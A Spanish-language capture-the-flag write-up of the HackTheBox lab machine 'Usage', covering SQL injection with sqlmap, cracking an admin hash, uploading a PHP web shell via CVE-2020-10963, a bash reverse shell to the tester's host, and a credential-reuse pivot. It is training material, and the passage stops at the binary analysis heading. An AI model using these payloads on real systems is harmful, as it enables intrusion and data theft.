---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Usage

`Usage` es una máquina Linux sencilla que cuenta con un sitio de blog vulnerable a la inyección SQL, lo que permite que la contraseña en hash del administrador se descargue y se descifre. Esto conduce al acceso al panel de administración, donde se abusa de un módulo `Laravel` obsoleto para cargar un shell web PHP y obtener la ejecución remota de código. En la máquina, las credenciales de texto sin formato almacenadas en un archivo permiten el acceso SSH como otro usuario, que puede ejecutar un binario personalizado como `root`. La herramienta realiza una llamada insegura a `7zip`, que se aprovecha para leer la clave SSH privada del usuario `root` y comprometer completamente el sistema.

<figure><img src="../../.gitbook/assets/Usage.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`Usage`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.18 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 23:29 CET
Initiating SYN Stealth Scan at 23:29
Scanning 10.10.11.18 [65535 ports]
Discovered open port 80/tcp on 10.10.11.18
Discovered open port 22/tcp on 10.10.11.18
Completed SYN Stealth Scan at 23:30, 24.65s elapsed (65535 total ports)
Nmap scan report for 10.10.11.18
Host is up, received user-set (0.067s latency).
Scanned at 2025-03-06 23:29:55 CET for 24s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.77 seconds
           Raw packets sent: 67437 (2.967MB) | Rcvd: 67245 (2.691MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.18
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Nginx` y el servicio`SSH`.

```bash
❯ nmap -sCV -p22,80 10.10.11.18 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 23:33 CET
Nmap scan report for usage.htb (10.10.11.18)
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Daily Blogs
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   64.98 ms 10.10.14.1
2   50.77 ms usage.htb (10.10.11.18)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/5387_vmware_eLqoIEgJ8E.png" alt=""><figcaption></figcaption></figure>

Añadiremos en nuestro archivo `/etc/hosts` la siguiente entrada correspondiente.

```bash
❯ cat /etc/hosts | grep usage.htb
10.10.11.18 usage.htb
```

## Web Enumeration

Realizaremos a través de la herramienta de `whatweb` un reconocimiento inicial de las tecnologías que utiliza la aplicación web.

```bash
❯ whatweb -a 3 http://usage.htb
http://usage.htb [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

Por otro lado, ya que disponemos de un dominio llamado `usage.htb`, realizaremos una enumeración de posibles subdominios que se encuentren en la aplicación web. A través de la herramienta de `gobuster`, nos encontramos con un subdominio llamado `admin.usage.htb`.

```bash
❯ gobuster vhost -u http://usage.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://usage.htb/
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.usage.htb Status: 200 [Size: 3304]
```

Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep usage.htb
10.10.11.18 usage.htb admin.usage.htb
```

Accederemos a [http://usage.htb](http://usage.htb) y nos encontramos con un panel de inicio de sesión en la página `Login`, por otro lado, también existe una página llamada `Register` en la cual al parecer podemos registrarnos.

Finalmente, en la sección de `Admin`, al acceder somos redirigidos a [http://admin.usage.htb](http://admin.usage.htb) en la cual también nos aparece un panel de inicio de sesión, al parecer de una página administrativa.

{% tabs %}
{% tab title="LOGIN" %}
<figure><img src="../../.gitbook/assets/5392_vmware_uiqjXPJMOr.png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="REGISTER" %}
<figure><img src="../../.gitbook/assets/5391_vmware_9KhTTlSbqt.png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="ADMIN" %}
<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

Accederemos a [http://usage.htb/register](http://usage.htb/register) y probaremos de registrarnos con un nuevo usuario llamado `gzzcoo`.

<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>

Una vez tengamos el usuario registrado, accederemos con las credenciales registradas para verificar si somos redirigidos a una nueva página, etc.

<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>

Al acceder con nuestras credenciales, nos encontramos con un blog en el cual aparentemente no logramos visualizar ningún contenido relevante.

<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>

Al intentar acceder a una página que no existe, como por ejemplo [http://usage.htb/gzzcoo](http://usage.htb/gzzcoo), nos encontramos con el siguiente mensaje de error.

<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>

Investigamos el código fuente de la página a través de `Ctrl+U` y copiaremos el mensaje de error para buscar en Internet y comprobar por detrás cual es el servicio que se está ejecutando.

<figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>

Al buscar por Internet, nos encontramos que al parecer este mensaje de error está relacionado con `Laravel`.

{% hint style="info" %}
PHP es el lenguaje de programación más utilizado en mundo para desarrollar sitios web, aplicaciones web y los populares CMS, como WordPress o Joomla. Laravel crea un entorno de trabajo y proporciona herramientas a los desarrolladores para ayudarles a desarrollar en PHP sus aplicaciones web.
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>

Confirmamos buscando `404 Not Found Laravel` en Internet y nos aparece el mismo mensaje de error con el mismo estilo que nos mostró la página [http://usage.htb/gzzcoo](http://usage.htb/gzzcoo).

<figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>

Al analizar las cabeceras de la página web, también comprobamos de la existencia de una cookie relacionada con `laravel_session`.

```bash
❯ curl -I http://usage.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Cache-Control: no-cache, private
Date: Thu, 06 Mar 2025 23:20:32 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6IkhrMmVWRWpOQ0lqdUc3blUrM0VWblE9PSIsInZhbHVlIjoiaHIzbEllSEZMUUlyZHpnbGpQUDBHZC9TQkZEbzhzYjBLYnlUS0t0Z3YxU3FjUmlzOTAxbVNQVTZNQnFXVzV6eXZBWUlDeXk1dWFId0ZPRU9ldU54TXAwYk5VR01hVGNUQ1BnS1BTZEcyQmpnOWI0anBTdkNiczNDaUU3VVdPa0EiLCJtYWMiOiIwMjUwYjc5ZmE3YjI4NzMwZWI1Y2Y2NjcyMjNhOTVjNjAzNjcyZWEyZmJkZTZkYmI2MTNhZjMzNWYxNThmNDEwIiwidGFnIjoiIn0%3D; expires=Fri, 07 Mar 2025 01:20:32 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6InVuR0RxMWtEZi95V2hVOWQvYmNsRGc9PSIsInZhbHVlIjoiZmNGZnVhOEdsYms1QUdhK1l0M3ZGU0ZUOFRZWjMwelVkeVY3ZDhIY2lSVndZbGtRYTJBcGcxSjcyK1BhdXo4QUViYW9oY0V4ZDRKREdFYWpUNGN1MUJtL244Y051SXRnaTQ5d2VndVJqakdNbEpSbDlyTTdJWHhENkdrZXhpSnMiLCJtYWMiOiJjMDNjYmI4NGVmOTg5NzI3MTdhNmU0ZjhmMGNlOTg1NTBmZGFlZGQ5MjY5MTc5YzU2YWYzNDMyNzA2YWE1Y2FkIiwidGFnIjoiIn0%3D; expires=Fri, 07 Mar 2025 01:20:32 GMT; Max-Age=7200; path=/; httponly; samesite=lax
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
```

## Initial Access

### SQL Injection - Boolean-Based Blind Injection (sqlmap)

En [http://usage.htb/forget-password](http://usage.htb/forget-password) nos encontramos con una opción de restablecimiento de la contraseña. Al ingresar nuestro correo electrónico, verificamos que en un principio se envía un correo de restablecimiento de nuestra contraseña.

<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>

Al ingresar en el campo `Email-Address` un apóstrofe `'` nos encontramos que el servidor nos devuelve un error `500 SERVER ERROR`.

<figure><img src="../../.gitbook/assets/5403_vmware_1hPYzUilo2.png" alt=""><figcaption></figcaption></figure>

Probamos de introducir una inyección `SQL` para verificar si de algún modo se sanitiza esta entrada, pero en el resultado obtenido, comprobamos que podemos ingresar carácteres como `'` y no es sanitizado al parecer en ninguna parte, con lo que podríamos probar de verificar si esta entrada tiene inyecciones `SQL`.

Al parecer lo que nosotros pensamos que realiza esta opción es la siguiente consulta `SQL`.

```sql
SELECT * FROM users WHERE email = '{my input}';

SELECT * FROM users WHERE email = '' or 1=1;-- -';

```

<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>

Interceptaremos la solicitud con `BurpSuite`, haremos click derecho sobre la solicitud interceptada y le daremos a la opción de `Copy to file` para copiar esta solicitud en un archivo, que llamaremos `request`.

<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>

Comprobaremos que se nos ha guardado correctamente el archivo `request` el cual contiene la solicitud interceptada.

```bash
❯ cat request
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: http://usage.htb
Connection: keep-alive
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6ImttdkZJTkFOMjQyL2lERlc1U2t0WFE9PSIsInZhbHVlIjoiS3FuQ2RaS0NsMTN6N1pLSGEvOEdrVTRaMjRHQkhIU1lFSWVMN2NwUmo5d3pObjhoOFZuMmpQTkRIUlQ5cjNUZnZ5elNUYTFYd2tKUi9USjdKa1RoSTdIMlR6MWZzVGIwVFJEYXkwZy9hdFNKY0YrdE9lQWkzMHg5V3cwNTVLY3AiLCJtYWMiOiIxNjJlNmE5MDFkODcwM2NiZjYwYTZjM2QwZjJlMGZkYjM3ZTNkM2FhMmM3ZTQ3ZmYwZGJkYjE0ZjEwMWQyMDExIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkZUMzdheEVTRDZPY2RtVHpWZ3RRbmc9PSIsInZhbHVlIjoicUp5WXZtLzYzQmpNYnBKRlV1OUwvOXpZUEMxamdxVURQbkUvSU9mdzNJN1RSYzNhNkNYQys4NFVPNXBPUzhTVGJlZFBhVWdwNmJXMVF4U3VONlAweS92SGk1OUtsWUFLb0ZRMjF1U2laVWJCNXJLdVNSQjZ3aXp5WCtWemV6QlYiLCJtYWMiOiJmODFkMWQwZjhlOWRkZjI2Y2MzNmYxZmVlNDI5ZmIxMjE2MTc3YmVjODc5MmI4ZDI1NjZlYjBhOTI3ZjM0OGJiIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i

_token=4O8CPGJvEJCZZLmvRBc9IVXPbxsmeLewVJatlYKW&email=a
```

Realizaremos a través de la herramienta de `sqlmap` una prueba de inyección `SQL`automatizada para verificar si es vulnerable o no. Verificamos que detecta que por detrás se está corriendo un servicio de `MySQL`.

```bash
❯ sqlmap -r request --level 5 --risk 3 --threads 10 -p email --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:01:51 /2025-03-07/

[00:01:51] [INFO] parsing HTTP request from 'request'
[00:01:51] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[00:01:51] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[00:01:52] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[00:01:52] [INFO] testing for SQL injection on POST parameter 'email'
[00:01:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:02:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[00:02:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[00:03:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[00:03:18] [INFO] POST parameter 'email' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[00:03:20] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
```

A través de la siguiente consulta con `sqlmap`, comprobaremos las bases de datos existentes en la aplicación web. Verificamos de la existencia de una base de datos llamada `usage_blog`.

```bash
❯ sqlmap -r request --level 5 --risk 3 --threads 10 -p email --batch --dbms MySQL --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:12:24 /2025-03-07/

...[snip]...
                  
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

[00:13:51] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 166 times
[00:13:51] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/usage.htb'

[*] ending @ 00:13:51 /2025-03-07/
```

Comprobaremos las tablas de la base de datos `usage_blog` en el cual nos encontramos con diferentes tablas. De las tablas enumeradas, la que nos llama la atención es la `admin_users`.

```bash
❯ sqlmap -r request --level 5 --risk 3 --threads 10 -p email --batch --dbms MySQL -D usage_blog --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:15:13 /2025-03-07/

...[snip]...
       
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+

[00:22:02] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 761 times
[00:22:02] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/usage.htb'

[*] ending @ 00:22:02 /2025-03-07/
```

Realizamos un `dump` del contenido de las columnas presentes en la tabla `admin_users` y logramos encontrar la contraseña de usuario `Administrator` en formato hash.

```bash
❯ sqlmap -r request --level 5 --risk 3 --threads 10 -p email --batch --dbms MySQL -D usage_blog -T admin_users --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.2#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end users responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:24:05 /2025-03-07/

...[snip]...
                
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | lS1mrTh3fcFaqE7bbfirAWBB7cFKfOjjAss6g8ZnkQ6Pd38Hzn4mpugpx45v |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+

[00:31:14] [INFO] table 'usage_blog.admin_users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_users.csv'
[00:31:14] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 909 times
[00:31:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/usage.htb'

[*] ending @ 00:31:14 /2025-03-07/
```

### Cracking hashes

Comprobaremos a través de `hashid`de que el hash está en el siguiente formato, guardaremos este hash en un archivo llamado `hashes`.

A través de la herramienta de cracking, conocida como `john`, utilizaremos el diccionario de `rockyou.txt` y finalmente logramos romper el hash y obtener la contraseña en texto plano.

<pre class="language-bash"><code class="lang-bash">❯ hashid '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
Analyzing '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 

❯ echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > hashes
<strong>
</strong><strong>❯ john --wordlist:/usr/share/wordlists/rockyou.txt hashes
</strong>Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)     
1g 0:00:00:14 DONE (2025-03-07 00:35) 0.06973g/s 115.4p/s 115.4c/s 115.4C/s dipset..makayla
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
</code></pre>

Ingresaremos [http://admin.usage.htb](http://admin.usage.htb) y probaremos de acceder a través de las credenciales obtenidas.

<figure><img src="../../.gitbook/assets/imagen (482).png" alt=""><figcaption></figcaption></figure>

### Laravel Administrator 1.8.17 Exploitation - Arbitrary File Upload \[RCE] (CVE-2020-10963)

Nos encontramos con un panel de administración de `Laravel` en el cual en el footer nos aparece la versión `1.8.17`.

<figure><img src="../../.gitbook/assets/imagen (483).png" alt=""><figcaption></figcaption></figure>

Buscamos por Internet sobre diferentes vulnerabilidades de esta versión, en el cual encontramos el siguiente `CVE-2020-10963`.

<figure><img src="../../.gitbook/assets/imagen (484).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2020-10963" %}

{% hint style="danger" %}
FrozenNode Laravel-Administrator versiones hasta 5.0.12, permite una carga de archivos sin restricciones (y, en consecuencia, una Ejecución de Código Remota) por medio de una imagen de admin/tips\_image/image/file\_upload con contenido PHP dentro de una imagen GIF que tiene la extensión .php. NOTA: este producto está descontinuado.
{% endhint %}

Para poder abusar de esta vulnerabilidad, el objetivo será subir un archivo con extensión de imágen como `.jpg` y modificar antes de que se envíe en el servidor por la extensión `PHP`.&#x20;

Nuestro archivo `gzzcoo.jpg` contiene el siguiente contenido `PHP` que se trata de una `web shell`.

```bash
❯ cat gzzcoo.jpg
<?php
  system($_GET['cmd']);
?>
```

Accederemos a las propiedades del usuario `Administrator` y subiremos nuestro archivo malicioso, antes de darle a `Submit`, deberemos de interceptar la solicitud a través de `BurpSuite`.

<figure><img src="../../.gitbook/assets/5412_vmware_yfgDrNJ2Bq.png" alt=""><figcaption></figcaption></figure>

Al interceptar la solicitud, deberemos modificar la extensión del archivo para indicarle que sea `PHP` y así poder realizar el `Arbitrary File Upload`. Una vez lo modifiquemos, le daremos a `Forward`.

<figure><img src="../../.gitbook/assets/imagen (485).png" alt=""><figcaption></figcaption></figure>

Verificamos que se nos redirige a `/admin/auth/setting`en el cual volveremos a darle a `Forward`.

<figure><img src="../../.gitbook/assets/imagen (486).png" alt=""><figcaption></figcaption></figure>

Somos redirigidos a `/uploads/images/gzzcoo.php`, finalmente le daremos a `Forward` nuevamente.

<figure><img src="../../.gitbook/assets/imagen (487).png" alt=""><figcaption></figcaption></figure>

Verificamos que se ha subido correctamente al parecer nuestro archivo malicioso pero con extensión `PHP`.

<figure><img src="../../.gitbook/assets/imagen (488).png" alt=""><figcaption></figcaption></figure>

Haremos click derecho sobre la imagen e ingresaremos a la opción de `Open Image in New Tab`.

<figure><img src="../../.gitbook/assets/imagen (489).png" alt=""><figcaption></figcaption></figure>

Al acceder a la imagen, seremos redirigidos al directorio donde se ha subido nuestra `web shell`. Verificamos que podemos ejecutar comandos arbitrarios en el sistema vulnerable desde la misma página web o desde la herramienta `cURL`.

<figure><img src="../../.gitbook/assets/imagen (490).png" alt=""><figcaption></figcaption></figure>

```bash
❯ curl -s 'http://admin.usage.htb/uploads/images/gzzcoo.php?cmd=id'
uid=1000(dash) gid=1000(dash) groups=1000(dash)
```

El siguiente paso será lograr obtener acceso remoto al sistema, para ello nos pondremos en escucha con `nc`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Aplicaremos un `URL Encode` hacia el comando que queremos ejecutar, que en este caso es una Reverse Shell y utilizaremos la `web shell` para ejecutar la Reverse Shell.

```bash
❯ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"' | jq -sRr @uri
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%22

❯ curl -s 'http://admin.usage.htb/uploads/images/gzzcoo.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%22'
```

Comprobaremos que logramos acceder al sistema con el usuario `dash` y podemos visualizar la flag **user.txt**.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.18] 58584
bash: cannot set terminal process group (1206): Inappropriate ioctl for device
bash: no job control in this shell
dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /home/dash/user.txt    
cbd70***************************
```

Al obtener la Reverse Shell, realizaremos el tratamiento básico para obtener finalmente una TTY totalmente interactiva.

```bash
dash@usage:/var/www/html/project_admin/public/uploads/images$ script /dev/null -c bash
<min/public/uploads/images$ script /dev/null -c bash          
Script started, output log file is '/dev/null'.
dash@usage:/var/www/html/project_admin/public/uploads/images$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
dash@usage:/var/www/html/project_admin/public/uploads/images$ export TERM=xterm                       
dash@usage:/var/www/html/project_admin/public/uploads/images$ export SHELL=bash
dash@usage:/var/www/html/project_admin/public/uploads/images$ stty rows 46 columns 230
```

## Pivoting as xander user

Revisando el archivo `/etc/passwd`, nos encontramos con la existencia de otro usuario que dispone de `bash`. Esta información también logramos corroborarla en el directorio `/home`.

```bash
dash@usage:~$ cat /etc/passwd | grep bash; echo; ls -l /home
root:x:0:0:root:/root:/bin/bash
dash:x:1000:1000:dash:/home/dash:/bin/bash
xander:x:1001:1001::/home/xander:/bin/bash

total 8
drwxr-x--- 6 dash   dash   4096 Mar  6 23:53 dash
drwxr-x--- 4 xander xander 4096 Apr  2  2024 xander
```

### Information Leakage

Revisando nuestro directorio personal `/home/dash`, nos encontramos con un archivo `.monitrc`. Este archivo comprobamos que contiene credenciales en texto plano que podríamos intentar comprobar si se reutilizan en algún sitio.

{% hint style="info" %}
Sobre Monit. Se trata de una herramienta para la gestión y seguimiento de procesos, programas, archivos, directorios y sistemas de archivos en sistemas similares a UNIX. Lleva a cabo el mantenimiento y reparación automática y puede ejecutar acciones significativas para solventar la situación de error.
{% endhint %}

```bash
dash@usage:~$ ls -la
total 48
drwxr-x--- 6 dash dash 4096 Mar  6 23:52 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw------- 1 dash dash 1192 Mar  6 23:52 .monit.state
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Mar  6 22:28 user.txt
dash@usage:~$ cat .monitrc 
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```

Probamos de comprobar si estas credenciales se reutilizan para el usuario `xander`. Accedemos finalmente al equipo a través de `SSH` con las credenciales encontradas.

```bash
❯ sshpass -p '3nc0d3d_pa$$w0rd' ssh xander@usage.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

...[snip]...

xander@usage:~$ whoami
xander
```

## Privilege Escalation

### Abusing sudoers privilege

Revisando si el usuario `xander` dispone de algún privilegio de `sudoers`, nos encontramos que puede ejecutar como `sudo` el binario llamado `/usr/bin/usage_management`.

```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

### Analyzing binary with strings and GHIDRA

